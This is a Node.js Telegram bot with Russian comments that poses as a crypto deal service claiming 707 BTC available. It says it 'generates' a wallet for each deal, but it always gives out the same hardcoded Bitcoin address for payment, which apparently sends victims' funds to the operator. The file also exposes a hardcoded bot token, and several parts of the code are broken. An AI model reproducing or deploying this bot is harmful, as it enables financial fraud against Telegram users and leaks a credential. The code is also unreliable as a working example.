const TelegramBot = require('node-telegram-bot-api');
const uuidv4 = require('uuid');

// Токен бота
const token = '6146320655:AAGq_TSNJuKyc8PpvXHy-VxiYREcYRJe7OI';

// Количество доступных BTC
const availableBTC = 707;

// Объект для хранения данных о пользователях и сделках
const users = {};

// Конфигурация кнопок inline клавиатуры
const inlineKeyboard = {
  reply_markup: {
    inline_keyboard: [
      [{ text: '⚙️Создать новую сделку', callback_data: 'createDeal' }],
      [{ text: '🍥Подписаться на наш канал', url: 'https://t.me/cryptobotanika' }]
    ]
  }
};

// Создаем бота
const bot = new TelegramBot(token, { polling: true });

// Обработка команды /start
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  // Регистрируем нового пользователя
  users[userId] = {
    id: userId,
    balance: 0,
    deals: {}
  };

  // Отправляем сообщение с доступными криптовалютами и инструкцией
  bot.sendMessage(chatId, `💳Добро пожаловать в CRYPTO BOT\nДоступные криптовалюты:\nBTC ${availableBTC}\n➖➖➖➖➖➖➖➖➖➖➖➖\nПРИ ПОПОЛНЕНИИ БАЛАНСА НЕ ЗАБЫВАЙТЕ УКАЗЫВАТЬ ВАШ UserID`, inlineKeyboard);
});

// Обработка команды /sdelka
bot.onText(/\/sdelka/, (msg) => {
  const chatId = msg.chat.id;

  // Генерируем уникальный идентификатор сделки
  const dealId = uuidv4();

  // Добавляем сделку в объект пользователя
  const userId = msg.from.id;
  users[userId].deals[dealId] = {
    id: dealId,
    partnerId: null,
    amount: null,
    wallet: null
  };

  // Формируем текст сообщения с ссылкой на сделку
  const dealLink = `https://t.me/${bot.options.username}?start=deal_${dealId}`;
  const dealMessage = `Вы создали новую сделку! Отправьте эту ссылку партнеру по сделке: ${dealLink}`;

  // Отправляем сообщение с ссылкой на сделку
  bot.sendMessage(chatId, dealMessage);
});

// Обработка нажатия кнопок inline клавиатуры
bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const userId = query.from.id;
  const data = query.data;

  // Обработка нажатия кнопки "Создать новую сделку"
  if (data === 'createDeal') {
    // Генерируем уникальный идентификатор сделки
    const dealId = uuidv4();

    // Добавляем сделку в объект пользователя
    users[userId].deals[dealId] = {
      id: dealId,
      partnerId: null,
      amount: null,
      wallet: null
    };

    // Формируем текст сообщения с ссылкой на сделку
    const dealLink = `https://t.me/${bot.options.username}?start=deal_${dealId}`;
    const dealMessage = `Вы создали новую сделку! Отправьте эту ссылку партнеру по сделке: ${dealLink}`;

    // Отправляем сообщение с ссылкой на сделку
    bot.sendMessage(chatId, dealMessage);
  }
});

// Обработка перехода по ссылке на сделку
bot.on('message', (msg) => {
  // Извлекаем идентификатор сделки из ссылки
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const text = msg;
  // Проверяем, является ли сообщение ссылкой на сделку
  if (text && text.startsWith('https://t.me/' + bot.options.username + '?start=deal_')) {
    const dealId = text.split('deal_')[1];

    // Проверяем, существует ли сделка с таким идентификатором
    if (users[userId].deals[dealId]) {
      const deal = users[userId].deals[dealId];

      // Проверяем, является ли пользователь партнером по сделке
      if (!deal.partnerId) {
        // Сохраняем идентификатор партнера по сделке
        deal.partnerId = userId;

        // Отправляем сообщение с запросом суммы сделки
        const message = `Пользователь: ${msg.from.username} согласился с вами на сделку, введите сумму сделки:`;
        bot.sendMessage(chatId, message);
      } else {
        // Если пользователь уже был добавлен как партнер по сделке, отправляем сообщение об ошибке
        bot.sendMessage(chatId, 'По данной ссылке сделка уже создана');
      }
    } else {
      // Если сделка с таким идентификатором не найдена, отправляем сообщение об ошибке
      bot.sendMessage(chatId, 'Данная ссылка недействительна');
    }
  } else {
    // Если сообщение не является ссылкой на сделку, проверяем, ожидается ли ввод суммы сделки
    const deal = Object.values(users[userId].deals).find((deal) => deal.partnerId === userId && deal.amount === null);

    if (deal) {
      const amount = parseFloat(text);

      // Проверяем, является ли введенное значение числом и не превышает ли оно доступную сумму BTC
      if (isNaN(amount) || amount <= 0 || amount > availableBTC) {
        bot.sendMessage(chatId, `Сумма сделки должна быть числом, больше 0 и не превышать ${availableBTC} BTC`);
      } else {
        // Сохраняем сумму сделки
        deal.amount = amount;

        // Генерируем крипто-кошелек и сохраняем его
        const wallet = `bc1qf0ghldtatq5727zz7cvrrjsnaxdat5cn9yuxnz`;
        deal.wallet = wallet;

        // Формируем сообщение с инструкцией по оплате
        const message = `Отлично, теперь осталось пополнить эту сумму по сгенерированному крипто-кошельку\n\nВаш сгенерированный крипто кошелек: ${wallet}, отправьте на него ${amount} BTC`;

        // Отправляем сообщение с инструкцией по оплате
        bot.sendMessage(chatId, message);
      }
    }
  }
});